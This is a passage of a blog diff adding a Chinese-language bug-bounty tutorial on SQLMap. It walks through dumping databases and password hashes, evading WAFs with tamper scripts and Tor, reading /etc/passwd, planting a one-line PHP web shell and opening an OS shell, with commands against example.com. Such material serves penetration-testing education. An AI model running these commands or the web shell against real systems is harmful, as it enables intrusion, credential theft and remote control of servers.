+<h2 id="三、数据库枚举"><a href="#三、数据库枚举" class="headerlink" title="三、数据库枚举"></a>三、数据库枚举</h2><h3 id="5-数据库枚举"><a href="#5-数据库枚举" class="headerlink" title="5. 数据库枚举"></a>5. 数据库枚举</h3><h4 id="基本数据库数据枚举"><a href="#基本数据库数据枚举" class="headerlink" title="基本数据库数据枚举"></a>基本数据库数据枚举</h4><p>通常，在成功检测到SQLi漏洞后，我们可以开始枚举数据库的基本细节，枚举通常从检索基本信息开始：</p>
+<ul>
+<li>数据库版本标语（参数：<code>--banner</code>）</li>
+<li>当前用户名（参数：<code>--current-user</code>）</li>
+<li>当前数据库名称（参数：<code>--current-db</code>）</li>
+<li>检查当前用户是否拥有DBA（管理员）权限（参数：<code>--is-dba</code>）</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4rk30@linux$ sqlmap -u <span class="string">&quot;http://www.example.com/?id=1&quot;</span> --banner --current-user --current-db --is-dba</span><br></pre></td></tr></table></figure>
+
+<h4 id="表格枚举"><a href="#表格枚举" class="headerlink" title="表格枚举"></a>表格枚举</h4><p>在大多数常见的情况下，找到当前数据库名称后，检索表名将使用<code>--tables</code>参数，并使用<code>-D testdb</code>指定数据库名称，如下所示：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4rk30@linux$ sqlmap -u <span class="string">&quot;http://www.example.com/?id=1&quot;</span> --tables -D testdb</span><br></pre></td></tr></table></figure>
+
+<p>在找到感兴趣的表名后，可以使用<code>--dump</code>参数并使用<code>-T users</code>指定表名来检索其内容，如下所示：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">d4rk30@linux$ sqlmap -u <span class="string">&quot;http://www.example.com/?id=1&quot;</span> --dump -T <span class="built_in">users</span> -D testdb</span><br><span class="line"></span><br><span class="line">...SNIP...</span><br><span class="line">Database: testdb</span><br><span class="line"></span><br><span class="line">Table: <span class="built_in">users</span></span><br><span class="line">[4 entries]</span><br><span class="line">+----+--------+------------+</span><br><span class="line">| <span class="built_in">id</span> | name   | surname    |</span><br><span class="line">+----+--------+------------+</span><br><span class="line">| 1  | luther | blisset    |</span><br><span class="line">| 2  | fluffy | bunny      |</span><br><span class="line">| 3  | wu     | ming       |</span><br><span class="line">| 4  | NULL   | nameisnull |</span><br><span class="line">+----+--------+------------+</span><br><span class="line"></span><br><span class="line">[14:07:18] [INFO] table <span class="string">&#x27;testdb.users&#x27;</span> dumped to CSV file <span class="string">&#x27;/home/user/.local/share/sqlmap/output/www.example.com/dump/testdb/users.csv&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>控制台输出显示表格以格式化的CSV格式转储到本地文件<code>users.csv</code>中。</p>
+<p><img data-src="https://blog-img-1256870184.cos.ap-beijing.myqcloud.com/2023-10-17-pVBXxRz.png" alt="img"></p>
+<h4 id="表格-行枚举"><a href="#表格-行枚举" class="headerlink" title="表格&#x2F;行枚举"></a>表格&#x2F;行枚举</h4><p>当处理具有许多列或许多行的大型表格时，我们可以使用<code>-C</code>参数指定列，如下所示：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4rk30@linux$ sqlmap -u <span class="string">&quot;http://www.example.com/?id=1&quot;</span> --dump -T <span class="built_in">users</span> -D testdb -C name,surname</span><br></pre></td></tr></table></figure>
+
+<p>根据表格中的序号来缩小行的范围，我们可以使用<code>--start</code>和<code>--stop</code>参数来指定行，如下所示：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4rk30@linux$ sqlmap -u <span class="string">&quot;http://www.example.com/?id=1&quot;</span> --dump -T <span class="built_in">users</span> -D testdb --start=2 --stop=3</span><br></pre></td></tr></table></figure>
+
+<h4 id="条件枚举"><a href="#条件枚举" class="headerlink" title="条件枚举"></a>条件枚举</h4><p>如果需要根据已知的WHERE条件检索特定行，则可以使用<code>--where</code>参数，如下所示：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4rk30@linux$ sqlmap -u <span class="string">&quot;http://www.example.com/?id=1&quot;</span> --dump -T <span class="built_in">users</span> -D testdb --<span class="built_in">where</span>=<span class="string">&quot;name LIKE &#x27;f%&#x27;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="完整数据库枚举"><a href="#完整数据库枚举" class="headerlink" title="完整数据库枚举"></a>完整数据库枚举</h4><p>我们可以通过完全跳过<code>-T</code>的使用（例如<code>--dump -D testdb</code>）来检索相关数据库中的所有表。还可以使用<code>--dump-all</code>，会检索所有数据库的所有内容，通常<code>--dump-all</code>会和<code>--exclude-sysdbs</code>一起使用，这会跳过系统默认库中的数据，这些数据对渗透测试人员没有太多作用。</p>
+<h3 id="6-高级数据库枚举"><a href="#6-高级数据库枚举" class="headerlink" title="6. 高级数据库枚举"></a>6. 高级数据库枚举</h3><h4 id="数据库架构枚举"><a href="#数据库架构枚举" class="headerlink" title="数据库架构枚举"></a>数据库架构枚举</h4><p>如果我们想检索所有表的结构，以便我们可以全面了解数据库体系结构，我们可以使用<code>--schema</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4rk30@linux$ sqlmap -u <span class="string">&quot;http://www.example.com/?id=1&quot;</span> --schema</span><br></pre></td></tr></table></figure>
+
+<h4 id="搜索数据"><a href="#搜索数据" class="headerlink" title="搜索数据"></a>搜索数据</h4><p>当处理具有大量表和列的复杂数据库结构时，我们可以使用<code>--search</code>搜索感兴趣的数据库、表和列。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4rk30@linux$ sqlmap -u <span class="string">&quot;http://www.example.com/?id=1&quot;</span> --search -T user</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4rk30@linux$ sqlmap -u <span class="string">&quot;http://www.example.com/?id=1&quot;</span> --search -C pass</span><br></pre></td></tr></table></figure>
+
+<h4 id="密码枚举与破解"><a href="#密码枚举与破解" class="headerlink" title="密码枚举与破解"></a>密码枚举与破解</h4><p>当我们识别出包含密码的表，我们就可以使用<code>-T</code>检索该表，如前所示：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4rk30@linux$ sqlmap -u <span class="string">&quot;http://www.example.com/?id=1&quot;</span> --dump -D master -T <span class="built_in">users</span></span><br></pre></td></tr></table></figure>
+
+<p>在前面的例子中我们可以看到，SQLMap具有自动密码哈希破解功能。在检索任何类似于已知哈希格式的值时，SQLMap会提示我们对找到的哈希值执行基于字典的攻击。</p>
+<h4 id="数据库用户密码枚举与破解"><a href="#数据库用户密码枚举与破解" class="headerlink" title="数据库用户密码枚举与破解"></a>数据库用户密码枚举与破解</h4><p>除了在数据库表中找到的用户登录信息外，我们还可以尝试dump包含特定于数据库的用户登录信息的系统表内容。为了简化整个过程，SQLMap提供了一个专门用于此类任务的特殊参数<code>--passwords</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4rk30@linux$ sqlmap -u <span class="string">&quot;http://www.example.com/?id=1&quot;</span> --passwords --batch</span><br></pre></td></tr></table></figure>
+
+<h2 id="四、SQLMAP高级用法"><a href="#四、SQLMAP高级用法" class="headerlink" title="四、SQLMAP高级用法"></a>四、SQLMAP高级用法</h2><h3 id="7-绕过网络应用程序保护"><a href="#7-绕过网络应用程序保护" class="headerlink" title="7. 绕过网络应用程序保护"></a>7. 绕过网络应用程序保护</h3><h4 id="Anti-CSRF-Token绕过"><a href="#Anti-CSRF-Token绕过" class="headerlink" title="Anti-CSRF Token绕过"></a>Anti-CSRF Token绕过</h4><p>SQLMap有一些参数可以帮助绕过CSRF保护。最重要的参数是<code>--csrf-token</code>。通过指定令牌参数名称（应该已经在提供的请求数据中可用），SQLMap将自动尝试解析目标响应内容并搜索新的令牌值，以便在下一个请求中使用它们。</p>
+<p>此外，即使用户没有通过 –csrf-token 明确指定令牌的名称，如果提供的参数中包含任何常见的中缀（即 csrf、xsrf、token），用户将被提示是否在后续请求中更新它：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4rk30@linux$ sqlmap -u <span class="string">&quot;http://www.example.com/&quot;</span> --data=<span class="string">&quot;id=1&amp;csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE&quot;</span> --csrf-token=<span class="string">&quot;csrf-token&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Unique-Value绕过"><a href="#Unique-Value绕过" class="headerlink" title="Unique Value绕过"></a>Unique Value绕过</h4><p>在某些情况下，Web应用程序要求在某些参数内提供唯一值。这种机制与上述绕过CSRF技术类似，只是不需要解析网页内容。因此，只要确保每次请求的参数值都是唯一的，为此可使用参数<code>--randomize</code>，进行随机化的值的作为参数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4rk30@linux$ sqlmap -u <span class="string">&quot;http://www.example.com/?id=1&amp;rp=29125&quot;</span> --randomize=rp --batch</span><br></pre></td></tr></table></figure>
+
+<h4 id="Calculated-Parameter绕过"><a href="#Calculated-Parameter绕过" class="headerlink" title="Calculated Parameter绕过"></a>Calculated Parameter绕过</h4><p>另一个类似的机制是，Web应用程序期望根据某参数值计算出正确的参数值。最常见的情况是，一个参数值必须包含另一个参数值的Hash（例如，h&#x3D;MD5(id)）。为了绕过这个问题，应该使用<code>--eval</code>，请求被发送到目标之前，会使用python代码进行处理：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4rk30@linux$ sqlmap -u <span class="string">&quot;http://www.example.com/?id=1&amp;h=c4ca4238a0b923820dcc509a6f75849b&quot;</span> --<span class="built_in">eval</span>=<span class="string">&quot;import hashlib; h=hashlib.md5(id).hexdigest()&quot;</span> --batch</span><br></pre></td></tr></table></figure>
+
+<h4 id="IP地址隐藏"><a href="#IP地址隐藏" class="headerlink" title="IP地址隐藏"></a>IP地址隐藏</h4><p>如果我们想要隐藏我们的IP地址，或者某个网络应用程序有保护机制，将我们当前的IP地址列入黑名单，我们可以尝试使用代理或匿名网络Tor。可以使用参数<code>--proxy</code>（例如–proxy&#x3D;”socks4:&#x2F;&#x2F;177.39.187.70:33283”）设置代理，其中应添加一个有效的代理。</p>
+<p>此外，如果我们有代理列表，我们可以使用参数<code>--proxy-file</code>将它们提供给SQLMap。这样，SQLMap将按顺序遍历列表，在出现任何问题（例如，IP地址被列入黑名单）的情况下，它将跳过当前的代理并继续下一个。</p>
+<p>另一种选择是使用Tor网络，它提供了一种易于使用的匿名方式，我们的IP可以出现在Tor出口节点列表中的任何地方。在本地计算机上安装Tor后，本地端口9050或9150上应该有一个SOCKS4代理服务。通过使用<code>--tor</code>，SQLMap 会自动尝试查找本地端口并适当使用。</p>
+<h4 id="User-agent黑名单绕过"><a href="#User-agent黑名单绕过" class="headerlink" title="User-agent黑名单绕过"></a>User-agent黑名单绕过</h4><p>如果在运行SQLMap时出现立即问题（例如，从一开始就出现HTTP错误代码5XX），我们应该考虑的第一件事情之一是SQLMap使用的默认用户代理可能被列入黑名单，使用<code>--random-agent</code>可以轻松绕过此限制。</p>
+<h4 id="篡改脚本"><a href="#篡改脚本" class="headerlink" title="篡改脚本"></a>篡改脚本</h4><p>最后，在SQLMap中实现的最受欢迎的绕过WAF&#x2F;IPS解决方案的机制之一是所谓的“篡改”脚本。篡改脚本是一种特殊类型的脚本，用于在发送到目标之前修改请求，大多数情况下是为了绕过某些保护。</p>
+<p>篡改脚本可以在<code>--tamper</code>中链接在一起，一个接一个地运行（例如 –tamper&#x3D;between,randomcase）。</p>
+<p>值得关注的篡改脚步如下：</p>
+<table>
+<thead>
+<tr>
+<th>Tamper-Script</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0eunion</td>
+<td>用e0UNION代替UNION实例</td>
+</tr>
+<tr>
+<td>base64encode</td>
+<td>对给定有效载荷中的所有字符进行Base64编码</td>
+</tr>
+<tr>
+<td>between</td>
+<td>使用<code>NOT BETWEEN 0 AND #</code>替换<code>&gt;</code>，使用<code>BETWEEN # AND #</code>替换<code>=</code></td>
+</tr>
+<tr>
+<td>commalesslimit</td>
+<td>在MySQL实例中使用<code>LIMIT N OFFSET M</code>替换<code>LIMIT M, N</code></td>
+</tr>
+<tr>
+<td>equaltolike</td>
+<td>用<code>LIKE</code>替换所有出现的<code>=</code></td>
+</tr>
+<tr>
+<td>halfversionedmorekeywords</td>
+<td>在每个关键词前添加（MySQL）版本注释</td>
+</tr>
+<tr>
+<td>modsecurityversioned</td>
+<td>使用（MySQL）版本化注释进行完整查询</td>
+</tr>
+<tr>
+<td>modsecurityzeroversioned</td>
+<td>使用（MySQL）零版本注释进行完整查询</td>
+</tr>
+<tr>
+<td>percentage</td>
+<td>在每个字符前添加百分号<code>%</code>,（例如：SELECT -&gt; %S%E%L%E%C%T）</td>
+</tr>
+<tr>
+<td>plus2concat</td>
+<td>用（MsSQL）对应函数<code>CONCAT()</code>代替加号运算符<code>+</code></td>
+</tr>
+<tr>
+<td>randomcase</td>
+<td>用随机大小写值替换每个关键字字符（例如 SELECT -&gt; SEleCt）</td>
+</tr>
+<tr>
+<td>space2comment</td>
+<td>用注释&#96;&#x2F;替换空格字符</td>
+</tr>
+<tr>
+<td>space2dash</td>
+<td>将空格字符替换为一个破折号注释(——)，后面跟着一个随机字符串和一个新行(\n)</td>
+</tr>
+<tr>
+<td>space2hash</td>
+<td>将(MySQL)的空格字符()的实例替换为一个镑字符(#)，后面跟着一个随机字符串和一个新行(\n</td>
+</tr>
+<tr>
+<td>space2mssqlblank</td>
+<td>用有效备用字符集中的随机空白字符替换（MsSQL）空格字符的实例</td>
+</tr>
+<tr>
+<td>space2plus</td>
+<td>用加号<code>+</code>)代替空格字符</td>
+</tr>
+<tr>
+<td>space2randomblank</td>
+<td>用有效备用字符集中的随机空白字符替换空格字符</td>
+</tr>
+<tr>
+<td>symboliclogical</td>
+<td>用符号对应运算符&amp;&amp;和</td>
+</tr>
+<tr>
+<td>versionedkeywords</td>
+<td>用（MySQL）版本注释括住每个非功能关键字</td>
+</tr>
+<tr>
+<td>versionedmorekeywords</td>
+<td>用（MySQL）版本注释括住每个关键词</td>
+</tr>
+</tbody></table>
+<h4 id="其他绕过方式"><a href="#其他绕过方式" class="headerlink" title="其他绕过方式"></a>其他绕过方式</h4><p>除了上面的保护绕过机制之外，还有两个需要提到的。</p>
+<p>第一个是使用<code>--chunked</code>开启的分块传输编码，它将POST请求的主体分成所谓的“块”。被列入黑名单的SQL关键字在块之间分割，以使包含它们的请求可以不被注意地通过。</p>
+<p>另一个绕过机制是HTTP参数污染（HPP），其中有效载荷被分割成类似于–chunked的方式，位于不同相同参数名称的值之间（例如?id&#x3D;1&amp;id&#x3D;UNION&amp;id&#x3D;SELECT&amp;id&#x3D;username,password&amp;id&#x3D;FROM&amp;id&#x3D;users…），如果目标平台支持，则由目标平台连接（例如ASP）。</p>
+<h3 id="8-操作系统EXP"><a href="#8-操作系统EXP" class="headerlink" title="8. 操作系统EXP"></a>8. 操作系统EXP</h3><h4 id="检查DBA权限"><a href="#检查DBA权限" class="headerlink" title="检查DBA权限"></a>检查DBA权限</h4><p>要检查我们是否具有SQLMap的DBA权限，我们可以使用以下<code>--is-dba</code>参数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4rk30@linux$ sqlmap -u <span class="string">&quot;http://www.example.com/case1.php?id=1&quot;</span> --is-dba</span><br></pre></td></tr></table></figure>
+
+<h4 id="读取本地文件"><a href="#读取本地文件" class="headerlink" title="读取本地文件"></a>读取本地文件</h4><p>SQLMap无需通过SQL手动注入，而是可以使用以下参数相对轻松地读取本地文件<code>--file-read</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4rk30@linux$ sqlmap -u <span class="string">&quot;http://www.example.com/?id=1&quot;</span> --file-read <span class="string">&quot;/etc/passwd&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="写入本地文件"><a href="#写入本地文件" class="headerlink" title="写入本地文件"></a>写入本地文件</h4><p>大多数DBMS默认情况下禁用文件写入，并且DBA需要某些权限才能写入文件。尽管如此，许多Web应用程序都需要DBMS能够将数据写入文件，因此值得测试我们是否可以将文件写入远程服务器。要使用SQLMap来做到这一点，我们可以使用<code>--file-write</code>和<code>--file-dest</code>参数。首先，我们准备一个基本的PHP Web shell并将其写入shell.php文件中：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4rk30@linux$ <span class="built_in">echo</span> <span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> &gt; shell.php</span><br></pre></td></tr></table></figure>
+
+<p>现在，让我们尝试在远程服务器的<code>/var/www/html/</code>目录中写入该文件。如果我们不知道服务器的<code>webroot</code>，我们会看到SQLMap会自动找到它。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4rk30@linux$ sqlmap -u <span class="string">&quot;http://www.example.com/?id=1&quot;</span> --file-write <span class="string">&quot;shell.php&quot;</span> --file-dest <span class="string">&quot;/var/www/html/shell.php&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>现在，我们可以尝试访问远程PHP shell，并执行示例命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4rk30@linux$ curl http://www.example.com/shell.php?cmd=<span class="built_in">ls</span>+-la</span><br></pre></td></tr></table></figure>
+
+<h4 id="操作系统命令执行"><a href="#操作系统命令执行" class="headerlink" title="操作系统命令执行"></a>操作系统命令执行</h4><p>要获得SQLMap带有的操作系统shell，我们可以使用<code>--os-shell</code>，如下所示：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4rk30@linux$ sqlmap -u <span class="string">&quot;http://www.example.com/?id=1&quot;</span> --os-shell</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>SQLMap默认使用UNION获取操作系统shell的技术，如果最终未能给我们任何输出。我们有多种类型的SQL注入漏洞，让我们尝试指定另一种更有可能为我们提供直接输出的技术，例如 ，机遇错误的注入，我们可以使用<code>--technique=E</code>来指定。</p>
+</blockquote>
+<p>更完整的使用方法，可以参看SQLMap官方文档：<a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">https://github.com/sqlmapproject/sqlmap/wiki/Usage</a></p>
+
     </div>
 
     
@@ -259,7 +513,7 @@
   </li>
   <li class="post-copyright-link">
       <strong>本文链接：</strong>
-      <a href="https://www.nohacker.me/2023/10/15/bug-bounty-hunter-sqlmap-essentials/" title="【Bug Bounty Hunter】第九章-SQLMAP 精要">https://www.nohacker.me/2023/10/15/bug-bounty-hunter-sqlmap-essentials/</a>
+      <a href="https://www.nohacker.me/2023/10/15/bug-bounty-hunter-sqlmap-essentials/" title="【Bug Bounty Hunter】第九章-SQLMap精要">https://www.nohacker.me/2023/10/15/bug-bounty-hunter-sqlmap-essentials/</a>
   </li>
   <li class="post-copyright-license">
       <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -269,8 +523,9 @@
 
           <div class="post-tags">
               <a href="/tags/%E5%AE%89%E5%85%A8/" rel="tag"># 安全</a>
-              <a href="/tags/Web-%E5%AE%89%E5%85%A8/" rel="tag"># Web 安全</a>
-              <a href="/tags/SQL-%E6%B3%A8%E5%85%A5/" rel="tag"># SQL 注入</a>
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+              <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"># SQL注入</a>
+              <a href="/tags/SQLMap/" rel="tag"># SQLMap</a>
           </div>
 
         
